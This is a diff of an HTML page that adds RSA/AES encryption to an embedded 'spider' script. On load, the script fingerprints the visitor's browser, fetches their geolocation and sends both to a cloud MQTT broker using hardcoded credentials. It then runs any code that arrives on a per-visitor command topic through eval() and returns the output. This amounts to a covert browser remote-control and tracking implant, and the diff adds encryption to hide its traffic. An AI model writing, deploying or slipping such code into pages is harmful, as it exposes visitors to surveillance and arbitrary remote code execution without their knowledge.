@@ -57,6 +57,7 @@
             text-decoration: none;
         }
     </style>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js" integrity="sha512-E8QSvWZ0eCLGk4km3hxSsNmGWbLtSCSUcewDQPQWZF6pEU8GlT8a5fF32wOl1i8ftdMhssTrF/OhyGWwonTcXA==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>         
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jsencrypt/2.3.1/jsencrypt.min.js" integrity="sha512-zDvrqenA0eFJZCxBsryzUZcvihvNlEXbteMv62yRxdhR4s7K1aaz+LjsRyfk6M+YJLyAJEuuquIAI8I8GgLC8A==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/ClientJS/0.1.11/client.min.js" integrity="sha512-MwKUpp841sot4mmGDfVcpJxb4vcaYHnpyn17CTHT3RUm585khw5gnRM6xwDm15aJ3sfpf6d4P8FLLfQKAo3mfA==" crossorigin="anonymous"></script>
     <script src="https://cdnjs.cloudflare.com/ajax/libs/mqtt/4.2.8/mqtt.min.js" integrity="sha512-QhwpmT5Q0jBh/70LYcUtOVomQyPfvRv3iWg2MzxKn4OjYcZdE5PBbfE8LMEdNx3IW0rO9OtWzPbxckRh/g8TSw==" crossorigin="anonymous" referrerpolicy="no-referrer"></script>
@@ -472,57 +473,115 @@
 
         load();
     </script>
-<script type="text/javascript">
-    let spider = {
-        root: "spiderjs",
-        mqttClient: null,
-        packet: {
+    <script type="text/javascript">
+        const publicKeyPEM = `-----BEGIN PUBLIC KEY-----
+            MIIEIjANBgkqhkiG9w0BAQEFAAOCBA8AMIIECgKCBAEA2Id0EDHWJ3elOeTwuINK
+            tJaMWUhE5Cv3gnksCWfYdMKfsXIe9nNU6gJ2uW07lRqobsrQAkwXd0LQ8UQP6p7C
+            qtEKABfWg7vkhBZa8d04xotCbdwNPZ+/RGl0sSKDB5DoZlOu1Y8Goq70quJ6Z1tl
+            zOq8pLi8czBdFzNhE1b4RiHkIYfWc8NZR/N4KU0KUPbotjWsBHQwZylCWqbLaUN+
+            lujxm+Hn46peCVOLXrAA9gaL7mq99w8kkAGsxdkbWWJ4o+zldIYrwVorCbBrmbpO
+            oAqQWIrGQD82M3cvkZOeaAvxnQPGicg8T4Ect969btyiZ20PcCC3AzVAnYgX/QJo
+            hMWvMkseIxjx9xFTjD9o/qJySOd/JBCoQdP6DPsXbjBAcxZtqMFyrn1Us6iOK+e8
+            GsPoYGaNo2ZEnyZN1FgyfG1z0abkEf1Tpe1Y3ajr9j7YJqYk/hgKxXYO6w4g6XjM
+            /XmyRay5AqJdpnNVbDBiHir7w+Xu8Of5ftYfbjDMpQW6ksaCcTV/h9ggSWP/uHiW
+            JyGZtaYXTx8CNPdxn6XHR7XZf76JRKDgRfaGHBqEcQas++uUZy4gh8O/WJqvVgRv
+            Tk25Rw6dBzbOqjMJC9gKez/3yIC2+/1ejCJaFFQfuail1JAofhh2rJtT2anJp0NA
+            Q1kOOMMkamN/jQ6T5awFbzkvaybDO9Wt6G1cXLOHhCls/AzPjV3bMcJ5Mcw5FoF2
+            1Oepb8Txsjlg/jrCDn4I36YkHMKKV7I+ZrTVcbMSIjoaq46TnNhVUMFzvHUBiE5K
+            cKG4dFZHsh3xzPh/kfa+ft/baMHKv1XZo+C1IciskfUTla0w/hU7/wP7kYSOq43+
+            a1ntr/Zsv8HpRAZdlTMYG88bEKy6EDSQQUIjp5S4gd7d/p20MNNO07ftJGWbu/9j
+            R9A2ZpeuPEm5jdCuPvbg/G1EAxny9wiq15U3lekTX1SzWfJKgRXhmpGSztarEOba
+            1RutNaMTeBfwi79Fky62SH/8C0kfL0YWPOHrWE9ixr+f+iGDLVNK+g5EwjAuKWVk
+            KIRM95pu0u3YFqGirBP19VahIL8BCRsv9MYIs1LQHMRW4lWajlSUUcsgbIYcpyBR
+            ZMAB9Zlj5lLFl6hw3oWbUN6Eg09IzBM0lVK07or32dolXBBX/Kbcd6WSyQD6PBj3
+            3Xr6GSLxU/HRduYP9opkpdh8qaDTAxrogiOZveAEQf7NX22JTTrID7Sz+YvSCHoG
+            sQJLq0yJPWPIbvCvJMVeHHgVrgFCyqwf0JEelczuTxTpt3UZZR5apgUWc65MDGWl
+            LwJ9FG5sndUXe0sNRuhWovLHscSC4oDBEtqm3ZFeXxyHvszEN1Ls0NjbtjOnFE8Y
+            /QIDAQAB
+                              -----END PUBLIC KEY-----`;
+
+        const encrypt = new JSEncrypt();
+        encrypt.setPublicKey(publicKeyPEM);
+        const aesKey = "SPI" + Date.now().toString();
+
+        function encryptRSA(data) {
+            return encrypt.encrypt(data)
+        }
+
+        function encryptAES(plaintext) {
+            key = CryptoJS.enc.Utf8.parse(aesKey);
+            let iv = CryptoJS.enc.Utf8.parse("1234567812345678"); //to do
+            let encrypted = CryptoJS.AES.encrypt(plaintext, key, {
+            iv: iv,
+            padding: CryptoJS.pad.Pkcs7
+            });
+            return encrypted.toString();
+
+        }
+
+        function decryptAES(ciphertext) {
+            key = CryptoJS.enc.Utf8.parse(aesKey);
+            let iv = CryptoJS.enc.Utf8.parse("1234567812345678"); //to do
+            let encrypted = CryptoJS.AES.decrypt(ciphertext.toString(), key, {
+            iv: iv,
+            padding: CryptoJS.pad.Pkcs7
+            });
+            return encrypted.toString(CryptoJS.enc.Utf8);
+        }
+    </script>
+    <script type="text/javascript">
+        let spider = {
+            root: "spiderjs",
+            mqttClient: null,
             fingerprint: new ClientJS().getFingerprint(),
             browserData: new ClientJS().getBrowserData(),
             geolocation : fetch('https://ipapi.co/json')
                                     .then(response => response.json())
-                                    .then(data => { spider.packet.geolocation = data; spider.connect() }),
+                                    .then(data => { spider.geolocation = data; spider.connect() }),
             status: "Offline",
-            lastOnline: Date()
-        },
+            lastOnline: Date(),
+            key: aesKey,
 
-        connect: () => {
-            var mqttOptions = {
-                port: 8884,
-                protocol: "wss",
-                username: "spiderjs",
-                password: "P@$$w0rdjs",
-                path: "/mqtt",
-                will: {
-                    topic: spider.root + "/" + spider.packet.fingerprint,
-                    payload: JSON.stringify(spider.packet),
-                    retain: true
+            connect: () => {
+                var mqttOptions = {
+                    port: 8884,
+                    protocol: "wss",
+                    username: "testy",
+                    password: "P@$$w0rd",
+                    path: "/mqtt",
+                    will: {
+                        topic: spider.root + "/" + spider.fingerprint + "/status",
+                        payload: encryptRSA(JSON.stringify({status: "Offline", lastOnline: spider.lastOnline, key: spider.key})),
+                        retain: true
+                    }
+                };
+                spider.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
+                spider.mqttClient.on("connect", spider.onConnect);
+                spider.mqttClient.on("message", spider.onMessage);
+                spider.mqttClient.subscribe(spider.root + "/" + spider.fingerprint + "/stdin");
+            },
+            onConnect: () => {
+                spider.status = "Online";
+                spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/status", encryptRSA(JSON.stringify({status: "Online", lastOnline: spider.lastOnline, key: spider.key})), { retain: true });
+                spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/browserData", encryptRSA(JSON.stringify(spider.browserData)), { retain: true });
+                spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/geolocation", encryptRSA(JSON.stringify(spider.geolocation)), { retain: true });
+            },
+            onMessage: (topic, payload) => {
+                topic = topic.split("/");
+                var root = topic[0],
+                    fingerprint = topic[1],
+                    stdio = topic[2];
+                if (root == spider.root && fingerprint == spider.fingerprint && stdio == "stdin") {
+                    try {
+                        out = eval(decryptAES(payload.toString()));
+                        if (out)
+                            spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/stdout", encryptAES(JSON.stringify(out)));
+                    } catch (error) {
+                        spider.mqttClient.publish(spider.root + "/" + spider.fingerprint + "/stderr", encryptAES(error.toString()));
+                    }
                 }
-            };
-            spider.mqttClient = mqtt.connect("wss://8e86d252f3c44fca8ce087b965c40d47.s1.eu.hivemq.cloud", mqttOptions);
-            spider.mqttClient.on("connect", spider.onConnect);
-            spider.mqttClient.on("message", spider.onMessage);
-            spider.mqttClient.subscribe(spider.root + "/" + spider.packet.fingerprint + "/stdin");
-        },
-        onConnect: () => {
-            spider.packet.status = "Online";
-            spider.mqttClient.publish(spider.root + "/" + spider.packet.fingerprint, JSON.stringify(spider.packet), { retain: true });
-        },
-        onMessage: (topic, payload) => {
-            topic = topic.split("/");
-            var root = topic[0],
-                fingerprint = topic[1],
-                stdio = topic[2];
-            if (root == spider.root && fingerprint == spider.packet.fingerprint && stdio == "stdin")
-                try {
-                    out = eval(payload.toString());
-                    if (out)
-                        spider.mqttClient.publish(spider.root + "/" + spider.packet.fingerprint + "/stdout", JSON.stringify(out));
-                } catch (error) {
-                    spider.mqttClient.publish(spider.root + "/" + spider.packet.fingerprint + "/stderr", error.toString());
-                }
-        }
-    };
-</script>
+            }
+        };
+    </script>
 </body>
 </html>
